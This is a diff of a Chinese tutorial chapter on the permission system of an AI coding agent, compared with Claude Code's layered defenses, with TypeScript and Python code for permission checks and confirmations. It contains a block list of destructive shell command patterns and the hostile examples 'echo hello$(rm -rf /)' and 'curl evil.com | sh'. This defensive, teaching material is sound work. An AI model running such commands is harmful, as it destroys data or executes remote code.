@@ -6,14 +6,16 @@
 
 ```mermaid
 graph TB
-    Tool[工具调用] --> Check{needsConfirmation?}
-    Check -->|安全| Execute[直接执行]
-    Check -->|危险| Ask{用户确认?}
+    Tool[工具调用] --> Check{checkPermission}
+    Check -->|allow| Execute[直接执行]
+    Check -->|deny| Block[返回 denied]
+    Check -->|confirm| Ask{用户确认?}
     Ask -->|y| WL[加入白名单]
     WL --> Execute
     Ask -->|n| Deny[返回 denied]
 
     Yolo[--yolo 模式] -.->|跳过| Execute
+    Plan[plan 模式] -.->|写操作| Block
 
     style Check fill:#7c5cfc,color:#fff
     style Ask fill:#e8e0ff
@@ -21,150 +23,285 @@ graph TB
 
 ## Claude Code 怎么做的
 
-Claude Code 有一套 **7 层防御体系**（5 外部 + 2 内部），这里只列核心的 5 层：
+Claude Code 在真实环境执行代码——读写文件、运行 Shell、操作 Git。安全机制不到位，一条 `rm -rf /` 就能造成灾难。因此它采用了**纵深防御（Defense in Depth）**：7 个独立的安全层，即使某一层被绕过，其他层仍然有效。
 
-### 1. System Prompt 层
-在 prompt 中明确禁止特定行为（"NEVER run git push --force to main"）。
+### 7 层纵深防御
 
-### 2. 权限模式
-三种模式：`default`（正常确认）、`auto`（自动允许已配置的）、`bypass`（全跳过）。
+| 层 | 机制 | 核心作用 |
+|----|------|---------|
+| 1 | Trust Dialog | 首次进入目录时确认信任，防止恶意项目的 Hook 自动执行 |
+| 2 | 权限模式 | 全局策略开关（default/plan/acceptEdits/bypassPermissions/dontAsk） |
+| 3 | 权限规则匹配 | allow/deny/ask 规则，8 个来源，优先级从企业策略到会话级 |
+| 4 | Bash AST 分析 | tree-sitter 解析命令为 AST，23 项静态安全检查，FAIL-CLOSED 原则 |
+| 5 | 工具级验证 | validateInput + checkPermissions，保护危险文件路径和路径边界 |
+| 6 | 沙箱隔离 | macOS Seatbelt / Linux namespace，限制文件系统和网络访问范围 |
+| 7 | 用户确认 | 交互对话框 + Hook + ML 分类器竞速，第一个决定生效 |
 
-### 3. BashTool AST 分析 — `src/tools/BashTool/`
-对 shell 命令进行 AST 解析（不是正则），精确判断命令是否安全：
+几个值得了解的设计细节：
 
-```typescript
-// Claude Code 的 BashTool 安全检查（简化）
-function analyzeCommand(cmd: string): SecurityAssessment {
-  const ast = parseShellAST(cmd);  // 解析成 AST
-  for (const node of ast.commands) {
-    if (isDangerousCommand(node)) {
-      return { level: "dangerous", reason: "..." };
-    }
-  }
-  return { level: "safe" };
-}
-```
+**`bypassPermissions`（--yolo）并不是真的绕过一切**。源码检查顺序是：先检查 deny 规则（命中直接拒绝）→ 再检查 bypass-immune 路径（`.git/`、`.claude/` 等仍需确认）→ 最后才跳过普通确认。管理员通过 deny 规则可以对 `--yolo` 施加约束。
 
-### 4. 危险模式库 — `src/utils/permissions/dangerousPatterns.ts`
-维护一个详细的危险模式列表，每个模式有分类和说明。
+**Layer 4 为什么不用正则**：Shell 语法复杂，正则面对 `echo hello$(rm -rf /)` 这类命令会看到的是 `echo hello`，实际执行的却是 `rm -rf /`。tree-sitter 真正解析 AST，不理解的结构（命令替换、变量展开、控制流等）一律标记为 `too-complex`，要求用户确认。
 
-### 5. 权限配置文件
-持久化的权限配置，让用户可以预先授权某些操作。
+**Layer 7 的竞速机制**：UI 对话框、PermissionRequest Hook、ML 分类器三者同时启动，`createResolveOnce` 守卫确保只有第一个决定生效。一旦用户触碰对话框，Hook 和分类器的结果一律被丢弃——人类意图永远优先。对话框还有 200ms 防误触宽限期。
 
-完整的权限系统在 `src/utils/permissions/permissions.ts` 中，**52KB 一个文件**。
+**拒绝追踪**：连续拒绝 3 次触发降级（auto 模式回退到交互确认），总拒绝 20 次中止 Agent 执行——防止模型陷入反复尝试被拒绝操作的死循环。
 
 ## 我们的实现
 
-我们把 5 层简化为 **3 个组件**：
+把 7 层简化为 **3 个组件**：危险命令检测、统一权限检查、会话级白名单。
 
-### 1. 危险命令检测：16 个正则（含 6 个 Windows 专用）
+### 1. 危险命令检测
 
+用 16 个正则覆盖最常见的破坏性操作（10 个 Unix + 6 个 Windows）：
+
+<!-- tabs:start -->
+#### **TypeScript**
 ```typescript
-// tools.ts — 危险命令模式
-
+// tools.ts
 const DANGEROUS_PATTERNS = [
-  // Unix/通用
-  /\brm\s/,                              // rm 删除
-  /\bgit\s+(push|reset|clean|checkout\s+\.)/, // git 破坏性操作
-  /\bsudo\b/,                             // 提权
-  /\bmkfs\b/,                             // 格式化
-  /\bdd\s/,                               // 磁盘操作
-  />\s*\/dev\//,                           // 写设备文件
-  /\bkill\b/,                             // 杀进程
-  /\bpkill\b/,                            // 批量杀进程
-  /\breboot\b/,                           // 重启
-  /\bshutdown\b/,                         // 关机
-  // Windows 专用
-  /\bdel\s/i,                             // Windows 删除文件
-  /\brmdir\s/i,                           // Windows 删除目录
-  /\bformat\s/i,                          // Windows 格式化磁盘
-  /\btaskkill\s/i,                        // Windows 杀进程
-  /\bRemove-Item\s/i,                     // PowerShell 删除
-  /\bStop-Process\s/i,                    // PowerShell 杀进程
+  /\brm\s/,
+  /\bgit\s+(push|reset|clean|checkout\s+\.)/,
+  /\bsudo\b/,
+  /\bmkfs\b/,
+  /\bdd\s/,
+  />\s*\/dev\//,
+  /\bkill\b/,
+  /\bpkill\b/,
+  /\breboot\b/,
+  /\bshutdown\b/,
+  // Windows
+  /\bdel\s/i,
+  /\brmdir\s/i,
+  /\bformat\s/i,
+  /\btaskkill\s/i,
+  /\bRemove-Item\s/i,
+  /\bStop-Process\s/i,
 ];
 
 export function isDangerous(command: string): boolean {
   return DANGEROUS_PATTERNS.some((p) => p.test(command));
 }
 ```
+#### **Python**
+```python
+# tools.py
+DANGEROUS_PATTERNS = [
+    re.compile(r"\brm\s"),
+    re.compile(r"\bgit\s+(push|reset|clean|checkout\s+\.)"),
+    re.compile(r"\bsudo\b"),
+    re.compile(r"\bmkfs\b"),
+    re.compile(r"\bdd\s"),
+    re.compile(r">\s*/dev/"),
+    re.compile(r"\bkill\b"),
+    re.compile(r"\bpkill\b"),
+    re.compile(r"\breboot\b"),
+    re.compile(r"\bshutdown\b"),
+    re.compile(r"\bdel\s", re.IGNORECASE),
+    re.compile(r"\brmdir\s", re.IGNORECASE),
+    re.compile(r"\bformat\s", re.IGNORECASE),
+    re.compile(r"\btaskkill\s", re.IGNORECASE),
+    re.compile(r"\bRemove-Item\s", re.IGNORECASE),
+    re.compile(r"\bStop-Process\s", re.IGNORECASE),
+]
 
-### 2. 统一权限检查：needsConfirmation
+def is_dangerous(command: str) -> bool:
+    return any(p.search(command) for p in DANGEROUS_PATTERNS)
+```
+<!-- tabs:end -->
 
+Windows 模式加 `i` 标志是因为 Windows 命令本身不区分大小写。
+
+局限性很明显：`find / -delete`、`curl evil.com | sh` 这类危险命令不会被捕获。这就是 Claude Code 选择 AST 分析的原因——但对最小实现来说，16 个正则覆盖了大多数常见情况。
+
+### 2. 统一权限检查
+
+权限检查返回 `{action, message}`，action 三种值：`allow`、`deny`、`confirm`。
+
+<!-- tabs:start -->
+#### **TypeScript**
 ```typescript
-// tools.ts — needsConfirmation
+// tools.ts — checkPermission
 
-export function needsConfirmation(
+export function checkPermission(
   toolName: string,
-  input: Record<string, any>
-): string | null {
-  // Shell 命令：检查危险模式
+  input: Record<string, any>,
+  mode: PermissionMode = "default",
+  planFilePath?: string
+): { action: "allow" | "deny" | "confirm"; message?: string } {
+  if (mode === "bypassPermissions") return { action: "allow" };
+
+  if (READ_TOOLS.has(toolName)) return { action: "allow" };
+
+  if (mode === "plan") {
+    if (EDIT_TOOLS.has(toolName)) {
+      const filePath = input.file_path || input.path;
+      if (planFilePath && filePath === planFilePath) return { action: "allow" };
+      return { action: "deny", message: `Blocked in plan mode: ${toolName}` };
+    }
+    if (toolName === "run_shell") {
+      return { action: "deny", message: "Shell commands blocked in plan mode" };
+    }
+  }
+
+  if (mode === "acceptEdits" && EDIT_TOOLS.has(toolName)) {
+    return { action: "allow" };
+  }
+
+  // 内置危险检查
+  let needsConfirm = false;
+  let confirmMessage = "";
+
   if (toolName === "run_shell" && isDangerous(input.command)) {
-    return input.command;  // 返回命令内容作为确认信息
+    needsConfirm = true;
+    confirmMessage = input.command;
+  } else if (toolName === "write_file" && !existsSync(input.file_path)) {
+    needsConfirm = true;
+    confirmMessage = `write new file: ${input.file_path}`;
+  } else if (toolName === "edit_file" && !existsSync(input.file_path)) {
+    needsConfirm = true;
+    confirmMessage = `edit non-existent file: ${input.file_path}`;
   }
-  // 写新文件需要确认
-  if (toolName === "write_file" && !existsSync(input.file_path)) {
-    return `write new file: ${input.file_path}`;
+
+  if (needsConfirm) {
+    if (mode === "dontAsk") {
+      return { action: "deny", message: `Auto-denied (dontAsk mode): ${confirmMessage}` };
+    }
+    return { action: "confirm", message: confirmMessage };
   }
-  // 编辑不存在的文件
-  if (toolName === "edit_file" && !existsSync(input.file_path)) {
-    return `edit non-existent file: ${input.file_path}`;
-  }
-  return null;  // 安全，不需要确认
+
+  return { action: "allow" };
 }
 ```
+#### **Python**
+```python
+# tools.py — check_permission
 
-设计决策：
+def check_permission(
+    tool_name: str,
+    inp: dict,
+    mode: str = "default",
+    plan_file_path: str | None = None,
+) -> dict:
+    if mode == "bypassPermissions":
+        return {"action": "allow"}
 
-- **`run_shell` + 危险模式** → 需要确认
-- **`write_file` + 新文件** → 需要确认（防止创建意外文件）
-- **`edit_file` + 不存在** → 需要确认（会失败，但给用户提示）
-- **`read_file`、`list_files`、`grep_search`** → 永远安全，无需确认
+    rule_result = _check_permission_rules(tool_name, inp)
+    if rule_result == "deny":
+        return {"action": "deny", "message": f"Denied by permission rule for {tool_name}"}
+    if rule_result == "allow":
+        return {"action": "allow"}
 
-### 3. 会话级白名单：confirmedPaths
+    if tool_name in READ_TOOLS:
+        return {"action": "allow"}
 
-在 Agent Loop 中，权限检查和白名单结合使用：
+    if mode == "plan":
+        if tool_name in EDIT_TOOLS:
+            file_path = inp.get("file_path") or inp.get("path")
+            if plan_file_path and file_path == plan_file_path:
+                return {"action": "allow"}
+            return {"action": "deny", "message": f"Blocked in plan mode: {tool_name}"}
+        if tool_name == "run_shell":
+            return {"action": "deny", "message": "Shell commands blocked in plan mode"}
 
+    if mode == "acceptEdits" and tool_name in EDIT_TOOLS:
+        return {"action": "allow"}
+
+    needs_confirm = False
+    confirm_message = ""
+
+    if tool_name == "run_shell" and is_dangerous(inp.get("command", "")):
+        needs_confirm = True
+        confirm_message = inp.get("command", "")
+    elif tool_name == "write_file" and not Path(inp.get("file_path", "")).exists():
+        needs_confirm = True
+        confirm_message = f"write new file: {inp.get('file_path', '')}"
+    elif tool_name == "edit_file" and not Path(inp.get("file_path", "")).exists():
+        needs_confirm = True
+        confirm_message = f"edit non-existent file: {inp.get('file_path', '')}"
+
+    if needs_confirm:
+        if mode == "dontAsk":
+            return {"action": "deny", "message": f"Auto-denied (dontAsk mode): {confirm_message}"}
+        return {"action": "confirm", "message": confirm_message}
+
+    return {"action": "allow"}
+```
+<!-- tabs:end -->
+
+触发确认的条件：`run_shell` + 危险命令，`write_file` / `edit_file` + 目标不存在。`read_file`、`list_files`、`grep_search` 永远安全。
+
+### 3. 会话级白名单
+
+在 Agent Loop 中，用 `confirmedPaths` Set 记住已授权的操作：
+
+<!-- tabs:start -->
+#### **TypeScript**
 ```typescript
-// agent.ts — chatAnthropic 中的权限检查
+// agent.ts
 
-// Agent 类成员
 private confirmedPaths: Set<string> = new Set();
 
-// 在工具执行前检查（5 种权限模式：default/plan/acceptEdits/bypassPermissions/dontAsk）
-const confirmMsg = needsConfirmation(toolUse.name, input, this.permissionMode);
-if (confirmMsg && !this.confirmedPaths.has(confirmMsg)) {
-  // 弹出确认提示
-  const confirmed = await this.confirmDangerous(confirmMsg);
+const perm = checkPermission(toolUse.name, input, this.permissionMode, this.planFilePath);
+
+if (perm.action === "deny") {
+  printInfo(`Denied: ${perm.message}`);
+  toolResults.push({
+    type: "tool_result",
+    tool_use_id: toolUse.id,
+    content: `Action denied: ${perm.message}`,
+  });
+  continue;
+}
+
+if (perm.action === "confirm" && perm.message && !this.confirmedPaths.has(perm.message)) {
+  const confirmed = await this.confirmDangerous(perm.message);
   if (!confirmed) {
     toolResults.push({
       type: "tool_result",
       tool_use_id: toolUse.id,
       content: "User denied this action.",
     });
-    continue;  // 跳过这个工具，但不中断整个循环
+    continue;
   }
-  // 记住用户的授权
-  this.confirmedPaths.add(confirmMsg);
+  this.confirmedPaths.add(perm.message);
 }
 ```
+#### **Python**
+```python
+# agent.py
 
-关键设计：
+self._confirmed_paths: set[str] = set()
 
-- **`confirmedPaths` 是 Set**：同一个操作只确认一次
-- **"User denied" 作为工具结果**：而不是抛错或中断循环。LLM 看到 denied 后会调整策略
-- **`--yolo` 跳过所有检查**：`permissionMode === "bypassPermissions"` 时 `needsConfirmation` 直接返回 null
+perm = check_permission(tu.name, inp, self.permission_mode, self._plan_file_path)
 
-### 确认对话框的实现
+if perm["action"] == "deny":
+    print_info(f"Denied: {perm.get('message', '')}")
+    tool_results.append({"type": "tool_result", "tool_use_id": tu.id,
+                         "content": f"Action denied: {perm.get('message', '')}"})
+    continue
 
+if perm["action"] == "confirm" and perm.get("message") and perm["message"] not in self._confirmed_paths:
+    confirmed = await self._confirm_dangerous(perm["message"])
+    if not confirmed:
+        tool_results.append({"type": "tool_result", "tool_use_id": tu.id,
+                             "content": "User denied this action."})
+        continue
+    self._confirmed_paths.add(perm["message"])
+```
+<!-- tabs:end -->
+
+拒绝时把 `"User denied this action."` 作为工具结果返回，而不是抛错或中断循环——LLM 看到后会调整策略，这是关键设计。
+
+### 确认对话框
+
+<!-- tabs:start -->
+#### **TypeScript**
 ```typescript
-// agent.ts — confirmDangerous
-
+// agent.ts
 private async confirmDangerous(command: string): Promise<boolean> {
-  printConfirmation(command);  // "⚠ Dangerous command: rm -rf ..."
-  const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout,
-  });
+  printConfirmation(command);
+  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
   return new Promise((resolve) => {
     rl.question("  Allow? (y/n): ", (answer) => {
       rl.close();
@@ -173,84 +310,43 @@ private async confirmDangerous(command: string): Promise<boolean> {
   });
 }
 ```
-
-用临时的 readline 接口实现，避免与 REPL 的 readline 冲突。
+#### **Python**
+```python
+# agent.py
+async def _confirm_dangerous(self, command: str) -> bool:
+    print_confirmation(command)
+    if self.confirm_fn:
+        return await self.confirm_fn(command)
+    try:
+        answer = input("  Allow? (y/n): ")
+        return answer.lower().startswith("y")
+    except EOFError:
+        return False
+```
+<!-- tabs:end -->
 
 ### 5 种权限模式
 
-Claude Code 有 5 种权限模式，我们全部实现了：
-
-```typescript
-// tools.ts
-export type PermissionMode = "default" | "plan" | "acceptEdits" | "bypassPermissions" | "dontAsk";
-```
-
 | 模式 | 读工具 | 编辑工具 | Shell（安全） | Shell（危险） | 适用场景 |
 |------|--------|----------|-------------|-------------|---------|
-| `default` | ✅ allow | ⚠️ confirm(新文件) | ✅ allow | ⚠️ confirm | 日常使用 |
-| `plan` | ✅ allow | ❌ **deny** | ✅ allow | ⚠️ confirm | 只规划不执行 |
-| `acceptEdits` | ✅ allow | ✅ **allow** | ✅ allow | ⚠️ confirm | 信任编辑 |
-| `bypassPermissions` | ✅ allow | ✅ allow | ✅ allow | ✅ allow | 全信任（--yolo） |
-| `dontAsk` | ✅ allow | ❌ **deny** | ✅ allow | ❌ **deny** | CI/非交互 |
-
-```typescript
-// tools.ts — checkPermission 中的模式处理
-
-export function checkPermission(
-  toolName: string,
-  input: Record<string, any>,
-  mode: PermissionMode = "default"
-): { action: "allow" | "deny" | "confirm"; message?: string } {
-  // bypassPermissions: allow everything
-  if (mode === "bypassPermissions") return { action: "allow" };
-
-  // 读工具在所有模式下都安全
-  if (READ_TOOLS.has(toolName)) return { action: "allow" };
-
-  // plan 模式: 阻止所有编辑工具（plan 文件除外）+ shell 命令
-  if (mode === "plan") {
-    if (EDIT_TOOLS.has(toolName)) {
-      const filePath = input.file_path || input.path;
-      if (planFilePath && filePath === planFilePath) {
-        return { action: "allow" }; // plan 文件是唯一可写的
-      }
-      return { action: "deny", message: `Blocked in plan mode: ${toolName}` };
-    }
-    if (toolName === "run_shell") {
-      return { action: "deny", message: "Shell commands blocked in plan mode" };
-    }
-  }
-
-  // acceptEdits: 文件编辑自动放行
-  if (mode === "acceptEdits" && EDIT_TOOLS.has(toolName)) {
-    return { action: "allow" };
-  }
-
-  // ... 内置危险检查 ...
-
-  // dontAsk: 需确认的直接拒绝（适用于 CI 环境）
-  if (needsConfirm && mode === "dontAsk") {
-    return { action: "deny", message: `Auto-denied (dontAsk mode): ${confirmMessage}` };
-  }
-}
-```
-
-CLI 对应的 flags：
+| `default` | ✅ | ⚠️ confirm(新文件) | ✅ | ⚠️ confirm | 日常使用 |
+| `plan` | ✅ | ❌ deny | ❌ deny | ❌ deny | 只规划不执行 |
+| `acceptEdits` | ✅ | ✅ | ✅ | ⚠️ confirm | 信任编辑 |
+| `bypassPermissions` | ✅ | ✅ | ✅ | ✅ | --yolo |
+| `dontAsk` | ✅ | ❌ deny | ✅ | ❌ deny | CI/非交互 |
 
 ```bash
 mini-claude --yolo "..."           # bypassPermissions
-mini-claude --plan "..."           # plan mode: 只分析不修改
-mini-claude --accept-edits "..."   # acceptEdits: 自动批准编辑
-mini-claude --dont-ask "..."       # dontAsk: CI 模式
+mini-claude --plan "..."           # plan mode
+mini-claude --accept-edits "..."   # acceptEdits
+mini-claude --dont-ask "..."       # dontAsk（CI 环境）
 ```
 
-**`plan` 模式的动态切换**：除了 `--plan` CLI flag，模型还可以在对话中通过 `enter_plan_mode` / `exit_plan_mode` 工具动态切换。进入 plan mode 时，系统会生成一个 plan 文件路径（`~/.claude/plans/plan-<sessionId>.md`），这是 plan mode 中唯一可写的文件。退出时恢复之前的权限模式。系统提示中会注入结构化的工作流指引（Explore → Design → Write Plan → Exit），与 Claude Code 官方实现对齐。
+`plan` 模式下模型还可以通过 `enter_plan_mode` / `exit_plan_mode` 工具动态切换，系统会生成一个 plan 文件路径（`~/.claude/plans/plan-<sessionId>.md`）作为唯一可写文件。
 
-**`dontAsk` 的设计意义**：在 CI/CD 管道中运行时，没有用户来回答确认问题。`dontAsk` 让任何需要确认的操作直接失败，agent 看到 denied 后会调整策略（比如用更安全的方式完成任务）。
+### 权限规则
 
-### 权限规则：.claude/settings.json
-
-除了内置模式，还支持配置化的 allow/deny 规则（详见第 10 章）：
+除内置模式外，支持配置化规则（详见第 10 章）：
 
 ```json
 {
@@ -261,30 +357,20 @@ mini-claude --dont-ask "..."       # dontAsk: CI 模式
 }
 ```
 
-**优先级**：deny 规则 > allow 规则 > 模式逻辑 > 内置危险检测。
+优先级：deny 规则 > allow 规则 > 模式逻辑 > 内置危险检测。
 
-## 安全模型的局限性
-
-我们的安全机制相比 Claude Code 仍有简化：
-
-1. **正则匹配 vs AST 分析**：`rm -rf /` 能捕获，但 `find / -delete` 捕获不了
-2. **没有沙箱**：命令在当前用户权限下执行
-3. **没有 bypass-immune**：Claude Code 中某些危险路径（.git/、.ssh/）即使在 bypass 模式也需要确认
-
-但核心架构已对齐——5 种权限模式 + 配置化规则 + 内置检测，层次清晰。
-
-## 简化对比
+## 与 Claude Code 的差距
 
 | 维度 | Claude Code | mini-claude |
 |------|------------|-------------|
-| **防御层次** | 7 层 | 4 层（模式 + 规则 + 检测 + 确认） |
-| **命令分析** | AST 解析（23 项检查） | 正则匹配（10 模式） |
-| **权限模式** | 5 种 + 2 内部 | 5 种（default/plan/acceptEdits/bypass/dontAsk） |
-| **权限规则** | 8 源优先级 + 3 种匹配 | 2 源（用户 + 项目）+ 前缀匹配 |
-| **白名单** | 持久化 + 会话级 | 会话级 Set |
-| **沙箱** | macOS Seatbelt / Linux namespace | 无 |
-| **代码量** | ~52KB（permissions.ts 一个文件） | ~120 行 |
+| 防御层次 | 7 层 | 4 层（模式 + 规则 + 检测 + 确认） |
+| 命令分析 | AST 解析（23 项检查） | 正则匹配（16 模式） |
+| 权限规则来源 | 8 源优先级 | 2 源（用户 + 项目） |
+| 白名单 | 持久化 + 会话级 | 会话级 Set |
+| 沙箱 | macOS Seatbelt / Linux namespace | 无 |
+| bypass-immune 路径 | .git/、.ssh/ 等强制确认 | 无 |
+| 拒绝追踪 | 3/20 次阈值降级 | 无 |
+
+核心架构已对齐——5 种权限模式 + 配置化规则 + 内置检测，层次清晰。
 
 ---
-
-> **下一章**：安全机制保护了系统边界，但还有一个内部边界需要管理——LLM 的上下文窗口。当对话太长时怎么办？
